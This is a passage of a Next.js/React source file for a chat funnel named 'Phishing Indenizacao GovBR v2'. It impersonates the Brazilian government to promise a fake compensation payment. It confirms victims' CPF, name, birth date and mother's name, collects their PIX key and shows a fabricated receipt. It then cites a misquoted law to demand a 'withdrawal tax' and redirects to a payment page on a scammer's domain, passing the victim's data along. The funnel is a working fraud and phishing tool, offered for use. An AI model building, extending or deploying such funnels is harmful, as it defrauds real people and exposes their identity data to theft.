
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send, Volume2, Play, Pause } from 'lucide-react';

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrl?: string;
  style?: string;
}

interface FlowStepDataDisplayVideo {
  message?: string; // Introductory message for the video
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string;
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayDynamicImage {
    message: string;
    templateUrl?: string;
    dataMapping?: Array<{
        variable: string;
        x: number;
        y: number;
        font: string;
        size: number;
        color?: string;
    }>;
    imageAiHint?: string;
    imageAltText?: string;
}

interface FlowStep {
  key: string;
  type: 'displayVideo' | 'multipleChoice' | 'loading' | 'displayMessage' | 'textInput' | 'displayDynamicImage';
  delay_ms?: number;
  data: FlowStepDataDisplayVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayDynamicImage;
  nextStep?: string;
  isTerminal?: boolean;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];

  isDisplayMessage?: boolean;
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  audioUrl?: string;
  displayNote?: string;

  isDisplayImage?: boolean;
  imageUrl?: string;
  imageAlt?: string;
  imageAiHint?: string;
  imageMessage?: string;
}


const funnelDefinition: {
  funnelName: string;
  initialStep: string;
  globalVariables: Record<string, string>;
  steps: Record<string, FlowStep>;
} = {
  "funnelName": "Phishing Indenizacao GovBR v2",
  "initialStep": "step1_video",
  "globalVariables": {
    "indenizacaoValor": "R$ 5.960,50",
    "taxaValor": "R$ 61,90",
    "paymentLink": "https://site-do-golpista.com/checkout-pix"
  },
  "steps": {
    "step1_video": {
      "key": "step1_video",
      "type": "displayVideo",
      "delay_ms": 1000,
      "data": {
        "message": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
        "thumbnailText": "Clique para ativar o som"
      },
      "nextStep": "step2_intro_and_ask_mother"
    },
    "step2_intro_and_ask_mother": {
      "key": "step2_intro_and_ask_mother",
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.\n\nResponda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}.\n\nPor favor, confirme o nome de sua mãe.",
        "options": [
          {"text": "{{randomMotherName1}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{randomMotherName2}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{userMotherName}}", "nextStep": "step3_ask_civil_status"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_civil_status"}
        ]
      }
    },
    "step3_ask_civil_status": {
      "key": "step3_ask_civil_status",
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "Qual seu estado civil?",
        "options": [
          {"text": "Solteiro (a)", "nextStep": "step4_loading_validation"},
          {"text": "Casado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Divorciado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Viúvo (a)", "nextStep": "step4_loading_validation"}
        ]
      }
    },
    "step4_loading_validation": {
      "key": "step4_loading_validation",
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Validando suas respostas...",
        "duration_ms": 3000
      },
      "nextStep": "step5_confirmation_message"
    },
    "step5_confirmation_message": {
      "key": "step5_confirmation_message",
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Autenticidade confirmada!",
        "icon": "success_checkmark",
        "details": {
          "Nome": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Indenização": "{{indenizacaoValor}}",
          "Status": "Pré-aprovado"
        }
      },
      "nextStep": "step5b_audio_message"
    },
    "step5b_audio_message": {
      "key": "step5b_audio_message",
      "type": "displayMessage",
      "delay_ms": 200,
      "data": {
        "message": "Ouça a mensagem importante abaixo:",
        "audioUrl": "https://media.vocaroo.com/mp3/1aljVYTmQwkb"
      },
      "nextStep": "step6_ask_pix_type"
    },
    "step6_ask_pix_type": {
      "key": "step6_ask_pix_type",
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Para prosseguir, selecione a chave PIX que deseja usar para o recebimento:",
        "options": [
          {"text": "Telefone", "nextStep": "step7_input_pix_key"},
          {"text": "CPF (recomendado)", "nextStep": "step7_confirm_pix_key", "action": "setChavePixToUserCPF"},
          {"text": "Email", "nextStep": "step7_input_pix_key"},
        ]
      }
    },
    "step7_confirm_pix_key": {
      "key": "step7_confirm_pix_key",
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "ATENÇÃO: Verifique se a chave Pix (seu CPF) está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
        "options": [
          {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
          {"text": "Não, desejo usar outra chave.", "nextStep": "step7_input_pix_key"}
        ]
      }
    },
    "step7_input_pix_key": {
      "key": "step7_input_pix_key",
      "type": "textInput",
      "delay_ms": 1000,
      "data": {
          "message": "Por favor, digite sua chave PIX:",
          "placeholder": "Digite sua chave PIX aqui",
          "variableToSet": "chavePix"
      },
      "nextStep": "step7b_confirm_manual_pix_key"
    },
    "step7b_confirm_manual_pix_key": {
        "key": "step7b_confirm_manual_pix_key",
        "type": "multipleChoice",
        "delay_ms": 1500,
        "data": {
            "message": "ATENÇÃO: Verifique se a chave Pix está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
            "options": [
                {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
                {"text": "Não, desejo corrigir.", "nextStep": "step7_input_pix_key"}
            ]
        }
    },
    "step8_loading_pix_registration": {
      "key": "step8_loading_pix_registration",
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
        "duration_ms": 2500
      },
      "nextStep": "step9_pix_registered_message"
    },
    "step9_pix_registered_message": {
      "key": "step9_pix_registered_message",
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Chave PIX Cadastrada",
        "icon": "success_checkmark",
        "message": "Sua chave pix foi cadastrada com sucesso!",
        "details": {
          "Nome": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Status": "Aprovado"
        }
      },
      "nextStep": "step9b_audio_message"
    },
     "step9b_audio_message": {
      "key": "step9b_audio_message",
      "type": "displayMessage",
      "delay_ms": 200,
      "data": {
        "message": "Por favor, ouça a próxima mensagem:",
        "audioUrl": "https://media.vocaroo.com/mp3/1dTwVDw858sb"
      },
      "nextStep": "step10_ask_generate_receipt"
    },
    "step10_ask_generate_receipt": {
      "key": "step10_ask_generate_receipt",
      "type": "multipleChoice",
      "delay_ms": 3500,
      "data": {
        "message": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.\n\nIremos gerar seu comprovante do valor de {{indenizacaoValor}} neste instante.",
        "options": [
          {"text": "Desejo receber meu comprovante de recebimento.", "nextStep": "step11_generating_receipt_image"}
        ]
      }
    },
    "step11_generating_receipt_image": {
      "key": "step11_generating_receipt_image",
      "type": "displayDynamicImage",
      "delay_ms": 1000,
      "data": {
        "message": "Gerando seu comprovante de recebimento dos valores...",
        "templateUrl": "https://i.imgur.com/pQXJNTI.png",
        "imageAiHint": "receipt screenshot",
        "imageAltText": "Comprovante Gerado",
        "dataMapping": [
            {"variable": "{{userName}}", "x": 120, "y": 235, "font": "Arial", "size": 14, "color": "#333333"},
            {"variable": "{{userCPF}}", "x": 120, "y": 255, "font": "Arial", "size": 12, "color": "#333333"},
            {"variable": "{{indenizacaoValor}}", "x": 120, "y": 280, "font": "Arial Bold", "size": 16, "color": "#000000"},
            {"variable": "{{dataAtual}}", "x": 750, "y": 280, "font": "Arial", "size": 14, "color": "#333333"},
            {"variable": "{{taxaValor}}", "x": 750, "y": 330, "font": "Arial Bold", "size": 16, "color": "#008000"}
        ]
      },
      "nextStep": "step12_reveal_tax_message"
    },
    "step12_reveal_tax_message": {
      "key": "step12_reveal_tax_message",
      "type": "displayMessage",
      "delay_ms": 3000,
      "data": {
        "title": "Indenização Governamental",
        "details": {
          "Indenização disponível para saque": "{{indenizacaoValor}}",
          "Titular": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Imposto de Saque": "{{taxaValor}}"
        }
      },
      "nextStep": "step12b_audio_message"
    },
    "step12b_audio_message": {
      "key": "step12b_audio_message",
      "type": "displayMessage",
      "delay_ms": 200,
      "data": {
        "message": "Ouça com atenção a etapa final:",
        "audioUrl": "https://media.vocaroo.com/mp3/16Zw1tvwsXFB"
      },
      "nextStep": "step13_final_justification_and_cta"
    },
    "step13_final_justification_and_cta": {
      "key": "step13_final_justification_and_cta",
      "type": "multipleChoice",
      "delay_ms": 4000,
      "data": {
        "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
        "options": [
          {
            "text": "Concluir pagamento e receber minha indenização",
            "action": "redirectToPayment",
            "paymentUrl": "{{paymentLink}}"
          }
        ]
      }
    }
  }
};

const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_3';
const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_3';
const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_3';
const STORAGE_KEY_SESSION_ID = 'simulatedChatSessionId_v2_3';

const DEFAULT_APPEARANCE_DELAY_MS = 500;

const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);

  const [flowVariables, setFlowVariables] = useState<Record<string, any>>(() => {
    const initialGlobalVars = funnelDefinition.globalVariables || {};
    return {
        ...initialGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza', // Placeholder
        randomMotherName2: 'Joana Oliveira Costa', // Placeholder
        chavePix: initialParams.cpf || '---.---.---.--', // Default to userCPF
    };
  });

  const [isBotTyping, setIsBotTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioPlayerRef = useRef<HTMLAudioElement>(null);
  const videoPlayerRef = useRef<HTMLVideoElement>(null);

  const [currentVideoData, setCurrentVideoData] = useState<{
    videoUrl: string;
    introductoryMessage?: string;
    thumbnailText?: string;
  } | null>(null);
  const [showVideoSoundOverlay, setShowVideoSoundOverlay] = useState(true);
  const [isVideoMuted, setIsVideoMuted] = useState(true);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const [currentPlayingAudioId, setCurrentPlayingAudioId] = useState<string | null>(null);
  const [isAudioPlaying, setIsAudioPlaying] = useState(false);

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
  const justLoadedSessionRef = useRef(false);


  useEffect(() => {
    if (typeof window === 'undefined') return;

    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
    const storedSessionId = sessionStorage.getItem(STORAGE_KEY_SESSION_ID);

    let shouldResetChat = false;

    const defaultGlobalVars = funnelDefinition.globalVariables || {};
    const defaultFlowVars = {
        ...defaultGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza',
        randomMotherName2: 'Joana Oliveira Costa',
        chavePix: initialParams.cpf || '---.---.---.--',
    };

    if (initialParams.cpf && storedSessionId === currentSessionId) {
      const savedMessages = sessionStorage.getItem(STORAGE_KEY_MESSAGES);
      const savedStep = sessionStorage.getItem(STORAGE_KEY_STEP);
      const savedFlowVars = sessionStorage.getItem(STORAGE_KEY_VARIABLES);

      setMessages(savedMessages ? JSON.parse(savedMessages) : []);
      const stepToSet = (savedStep && funnelDefinition.steps[JSON.parse(savedStep)])
                         ? JSON.parse(savedStep)
                         : funnelDefinition.initialStep;
      setCurrentStepKey(stepToSet);

      const newFlowVariables = { ...defaultFlowVars };
      if (savedFlowVars) {
        const parsedSaved = JSON.parse(savedFlowVars);
        Object.keys(parsedSaved).forEach(key => {
            if (key in defaultGlobalVars || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName', 'dataAtual', 'randomMotherName1', 'randomMotherName2'].includes(key)) {
                 newFlowVariables[key] = parsedSaved[key];
            }
        });
      }
      setFlowVariables(newFlowVariables);
      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]");
    } else {
      shouldResetChat = true;
    }

    if (shouldResetChat) {
      sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
      sessionStorage.removeItem(STORAGE_KEY_STEP);
      sessionStorage.removeItem(STORAGE_KEY_VARIABLES);
      if (initialParams.cpf) {
        sessionStorage.setItem(STORAGE_KEY_SESSION_ID, currentSessionId);
      } else {
        sessionStorage.removeItem(STORAGE_KEY_SESSION_ID);
      }
      setMessages([]);
      setCurrentStepKey(funnelDefinition.initialStep);
      setFlowVariables(defaultFlowVars);
      prevCurrentStepKeyRef.current = undefined;
      justLoadedSessionRef.current = false;
    }
  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
      sessionStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(messages));
    }
  }, [messages, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
     if (typeof window === 'undefined') return;
    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
      sessionStorage.setItem(STORAGE_KEY_STEP, JSON.stringify(currentStepKey));
    }
  }, [currentStepKey, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentSessionId = `${initialParams.cpf}_${initialParams.nome}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
      const persistableFlowVariables: Record<string, any> = {};
      Object.keys(flowVariables).forEach(key => {
        if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName', 'dataAtual', 'randomMotherName1', 'randomMotherName2'].includes(key)) {
            persistableFlowVariables[key] = flowVariables[key];
        }
      });
      sessionStorage.setItem(STORAGE_KEY_VARIABLES, JSON.stringify(persistableFlowVariables));
    }
  }, [flowVariables, initialParams.cpf, initialParams.nome]);


  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = {
        ...(funnelDefinition.globalVariables || {}),
        ...initialParams,
        ...flowVariables,
    };

    allVars.userName = flowVariables.userName || initialParams.nome || 'Usuário';
    allVars.userCPF = flowVariables.userCPF || initialParams.cpf || '---.---.---.--';
    allVars.userBirthDate = flowVariables.userBirthDate || initialParams.nascimento || '--/--/----';
    allVars.userMotherName = flowVariables.userMotherName || initialParams.mae || 'Nome da Mãe Indisponível';


    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      let valueToInsert = String(allVars[key]);

      if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        }
        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) {
             valueToInsert = valueToInsert
                .split(' ')
                .map(word => word.charAt(0).toUpperCase() + word.slice(1))
                .join(' ');
        }
        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      } else {
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
      }
    }
    return formattedText;
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  const handleUserActionAndNavigate = (nextStepKey?: string) => {
    if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
    }
    setCurrentVideoData(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    setIsTextInputActive(false);
    setCurrentTextInputConfig(null);

    if (nextStepKey && funnelDefinition.steps[nextStepKey as keyof typeof funnelDefinition.steps]) {
        setCurrentStepKey(nextStepKey);
    } else if (nextStepKey) {
        console.error("SimulatedChatFlow: Invalid nextStepKey referenced:", nextStepKey);
    }
  };

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];

    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      if (prevCurrentStepKeyRef.current !== currentStepKey && !justLoadedSessionRef.current) {
        setMessages(prev => [...prev, {id: `err-invalid-step-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro interno no fluxo."}]);
      }
      setIsBotTyping(false);
      return;
    }

    setIsBotTyping(true);

    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    let processAsNewStep = isNewStep && !justLoadedSessionRef.current;


    const effectiveAppearanceDelay = stepConfig.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS;

    const typingTimer = setTimeout(() => {
      const processStepAfterDelayInternal = () => {
        let messageAddedInThisStep = false;

        if (processAsNewStep || (isNewStep && justLoadedSessionRef.current)) {
          switch (stepConfig.type) {
            case 'displayVideo': {
              const data = stepConfig.data as FlowStepDataDisplayVideo;
              setCurrentVideoData({
                videoUrl: data.videoUrl,
                introductoryMessage: data.message ? formatText(data.message) : undefined,
                thumbnailText: data.thumbnailText || "Clique para ativar o som"
              });
              setShowVideoSoundOverlay(true);
              setIsVideoMuted(true);
              break;
            }
            case 'multipleChoice': {
              const data = stepConfig.data as FlowStepDataMultipleChoice;
              const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
              const newBotMessage: Message = {
                id: `bot-msg-${Date.now()}`,
                sender: 'bot',
                text: formatText(data.message),
                options: formattedOptions,
                displayNote: data.note ? formatText(data.note) : undefined,
              };
              const lastMsg = messages[messages.length - 1];
              if (!lastMsg || lastMsg.text !== newBotMessage.text || JSON.stringify(lastMsg.options) !== JSON.stringify(newBotMessage.options)) {
                setMessages(prev => [...prev, newBotMessage]);
                messageAddedInThisStep = true;
              }
              break;
            }
            case 'loading': {
              const data = stepConfig.data as FlowStepDataLoading;
              setLoadingMessage(formatText(data.message));
              setIsLoadingStep(true);
              autoTransitionTimerRef.current = setTimeout(() => {
                if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key) {
                  setIsLoadingStep(false);
                  setLoadingMessage(null);
                  if (stepConfig.nextStep) {
                    handleUserActionAndNavigate(stepConfig.nextStep);
                  } else {
                     console.warn("Loading step ended but no nextStep defined for:", currentStepKey);
                  }
                }
              }, data.duration_ms);
              break;
            }
            case 'displayMessage': {
              const data = stepConfig.data as FlowStepDataDisplayMessage;
              const newBotDisplayMessage: Message = {
                id: `bot-display-msg-${Date.now()}`,
                sender: 'bot',
                isDisplayMessage: true,
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
                audioUrl: data.audioUrl,
                displayNote: data.note ? formatText(data.note) : undefined,
              };
              setMessages(prev => [...prev, newBotDisplayMessage]);
              messageAddedInThisStep = true;
              break;
            }
            case 'textInput': {
              const data = stepConfig.data as FlowStepDataTextInput;
              const newBotMessage: Message = {
                  id: `bot-text-input-prompt-${Date.now()}`,
                  sender: 'bot',
                  text: formatText(data.message)
              };
              const lastMsg = messages[messages.length - 1];
              if (!lastMsg || lastMsg.text !== newBotMessage.text) {
                setMessages(prev => [...prev, newBotMessage]);
                messageAddedInThisStep = true;
              }
              setCurrentTextInputConfig(data);
              setIsTextInputActive(true);
              setTextInputValue("");
              break;
            }
            case 'displayDynamicImage': {
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              console.warn("SimulatedChatFlow: 'displayDynamicImage' step type is simplified. Actual image generation with text overlay is not implemented on client. Data mapping provided in step config:", data.dataMapping);
              const newBotImageMessage: Message = {
                id: `bot-image-msg-${Date.now()}`,
                sender: 'bot',
                isDisplayImage: true,
                imageMessage: formatText(data.message) || "Gerando seu comprovante...",
                imageUrl: data.templateUrl,
                imageAlt: formatText(data.imageAltText) || "Comprovante",
                imageAiHint: data.imageAiHint,
              };
              setMessages(prev => [...prev, newBotImageMessage]);
              messageAddedInThisStep = true;
              break;
            }
            default:
              console.error("SimulatedChatFlow: Unknown step type in processAsNewStep:", (stepConfig as any).type);
              setMessages(prev => [...prev, {id: `err-type-new-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
              messageAddedInThisStep = true;
          }
        }
        setIsBotTyping(false);

        const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                  (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');

        let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
        if (stepConfig.type === 'displayMessage') {
            const msgData = stepConfig.data as FlowStepDataDisplayMessage;
            if (!msgData.audioUrl) {
                if (!msgData.details && !msgData.title) { // Message is likely just simple text
                     nextStepTransitionDelayMs = msgData.message ? Math.max(1200, msgData.message.length * 50) : 1200; // Adjust delay based on text length
                } else { // Has details or title, but no audio
                    nextStepTransitionDelayMs = 3500;
                }
            } else {
                // For messages with audio, transition is handled by audio 'ended' event.
                // This delay is a fallback or if audio fails to load/play.
                nextStepTransitionDelayMs = (audioPlayerRef.current?.duration || 8) * 1000 + 1500;
            }
        }


        if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current && messageAddedInThisStep))) {
            const data = stepConfig.data as FlowStepDataDisplayMessage;
            if (stepConfig.type !== 'displayMessage' || !data.audioUrl) {
                autoTransitionTimerRef.current = setTimeout(() => {
                    if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key) {
                        handleUserActionAndNavigate(stepConfig.nextStep as string);
                    }
                }, nextStepTransitionDelayMs);
            }
        }
      };
      processStepAfterDelayInternal();
    }, effectiveAppearanceDelay);

    if (isNewStep) {
      prevCurrentStepKeyRef.current = currentStepKey;
    }

    if (justLoadedSessionRef.current && isNewStep) {
        setTimeout(() => {
            justLoadedSessionRef.current = false;
        }, 0);
    }

    return () => {
      clearTimeout(typingTimer);
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  }, [currentStepKey, initialParams]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, currentVideoData, isTextInputActive, isBotTyping]);

  useEffect(() => {
    const audio = audioPlayerRef.current;
    if (audio) {
      const handleAudioEnded = () => {
        setIsAudioPlaying(false);
        // Do not nullify currentPlayingAudioId here, so the icon remains "Play"

        const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
        const currentMessageWithAudio = messages.find(m => m.id === currentPlayingAudioId);


        if (stepConfig?.type === 'displayMessage' &&
            (stepConfig.data as FlowStepDataDisplayMessage).audioUrl &&
            currentMessageWithAudio?.audioUrl === (stepConfig.data as FlowStepDataDisplayMessage).audioUrl &&
            stepConfig.nextStep) {
           if(autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
           // Add a slight delay before navigating to ensure UI updates (e.g., pause icon back to play)
           setTimeout(() => {
             handleUserActionAndNavigate(stepConfig.nextStep as string);
           }, 300);
        }
      };
      audio.addEventListener('ended', handleAudioEnded);
      return () => {
        audio.removeEventListener('ended', handleAudioEnded);
      };
    }
  }, [currentStepKey, messages, currentPlayingAudioId]);


  const handleOptionClick = (option: ChatOption) => {
    if (option.text === null || typeof option.text === 'undefined') {
      console.warn("SimulatedChatFlow: Option clicked with null or undefined text property.");
      return;
    }

    const userMessageId = `user-${Date.now()}`;
    setMessages(prevMsgs => [...prevMsgs, { id: userMessageId, sender: 'user', text: option.text }]);

    setMessages(prevMsgs => {
        const msgsCopy = [...prevMsgs];
        let repliedToBotMessageIndex = -1;
        for (let i = msgsCopy.length - 2; i >= 0; i--) {
            if (msgsCopy[i].sender === 'bot' && msgsCopy[i].options && msgsCopy[i].options.length > 0) {
                repliedToBotMessageIndex = i;
                break;
            }
        }
        if (repliedToBotMessageIndex !== -1) {
            msgsCopy[repliedToBotMessageIndex] = { ...msgsCopy[repliedToBotMessageIndex], options: undefined };
        }
        return msgsCopy;
    });

    setCurrentVideoData(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    setIsTextInputActive(false);
    setCurrentTextInputConfig(null);
    setIsBotTyping(true);
    if (isAudioPlaying && audioPlayerRef.current) {
      audioPlayerRef.current.pause();
      setIsAudioPlaying(false);
      setCurrentPlayingAudioId(null);
    }

    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = flowVariables.userCPF || "CPF não disponível";
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    }

    if (option.action === 'redirectToPayment' && option.paymentUrl) {
        let finalPaymentUrl = formatText(option.paymentUrl);
        try {
            const url = new URL(finalPaymentUrl);
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value as string);
                }
            });
            if (initialParams.cpf && !url.searchParams.has('cpf')) url.searchParams.set('cpf', initialParams.cpf);
            if (flowVariables.chavePix && !url.searchParams.has('chave_pix')) url.searchParams.set('chave_pix', flowVariables.chavePix);
            if (flowVariables.indenizacaoValor && !url.searchParams.has('valor_indenizacao')) url.searchParams.set('valor_indenizacao', flowVariables.indenizacaoValor);
             if (flowVariables.taxaValor && !url.searchParams.has('valor_taxa')) url.searchParams.set('valor_taxa', flowVariables.taxaValor);

            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
        }
        setIsBotTyping(false);
        return;
    }

    handleUserActionAndNavigate(option.nextStep);
  };

  const handleVideoThumbnailClick = () => {
    if (videoPlayerRef.current) {
      videoPlayerRef.current.muted = false;
      setIsVideoMuted(false);
      videoPlayerRef.current.play().catch(e => console.warn("Error trying to play video after unmuting:", e));
    }
    setShowVideoSoundOverlay(false);
  };

  const handleVideoEnded = () => {
